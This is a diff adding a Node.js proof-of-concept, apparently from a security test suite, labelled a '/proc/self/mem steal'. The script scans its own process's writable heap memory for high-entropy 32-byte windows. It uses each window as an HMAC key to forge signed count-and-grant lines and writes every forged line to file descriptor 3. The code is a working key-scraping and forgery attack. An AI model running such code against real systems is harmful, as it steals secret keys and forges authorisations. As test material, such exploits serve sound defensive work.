@@ -1,0 +1,26 @@
+// HoQ A11 /proc/self/mem steal (port of /workspace/q/k3/poc/g64-mem-steal.mjs): scan this process's own
+// writable heap-like memory for high-entropy 32-byte windows, use each as an HMAC-SHA256 key over a forged
+// count line, and write every candidate line to fd 3. Prints only counts, never key material.
+const fs = await import('node:fs'); const { createHmac } = await import('node:crypto');
+const probe = { id: 'x', n: 5, digest: 'cd'.repeat(32), grant: 'grant-1@1' };
+const mac = (k) => createHmac('sha256', k).update(`${probe.id}\n${probe.n}\n${probe.digest}\n${probe.grant}`).digest('hex');
+const info = { regions: 0, bytes: 0, candidates: 0, written: 0 };
+const maps = fs.readFileSync('/proc/self/maps', 'utf8'); const fd = fs.openSync('/proc/self/mem', 'r');
+for (const line of maps.split('\n')) {
+  const m = /^([0-9a-f]+)-([0-9a-f]+) rw/.exec(line);
+  if (!m || line.includes('.so') || line.includes('/dev/') || line.includes('vsyscall')) continue;
+  if (!(line.includes('[heap]') || /^\S+ \S+ 0+ 00:00 0\s*$/.test(line))) continue;
+  const start = parseInt(m[1], 16), end = parseInt(m[2], 16);
+  if (!Number.isSafeInteger(end) || end <= start) continue;
+  const len = Math.min(end - start, 16 * 1024 * 1024); const buf = Buffer.alloc(len); let got = 0;
+  try { got = fs.readSync(fd, buf, 0, len, start); } catch { continue; }
+  info.regions++; info.bytes += got;
+  for (let i = 0; i + 32 <= got && info.written < 20000; i += 8) {
+    const seen = new Set(); for (let j = 0; j < 32; j++) seen.add(buf[i + j]);
+    if (seen.size < 26) continue;
+    info.candidates++; info.written++;
+    fs.writeSync(3, JSON.stringify({ ...probe, mac: mac(buf.subarray(i, i + 32)) }) + '\n');
+  }
+}
+fs.closeSync(fd);
+console.log('STEALINFO ' + JSON.stringify(info));
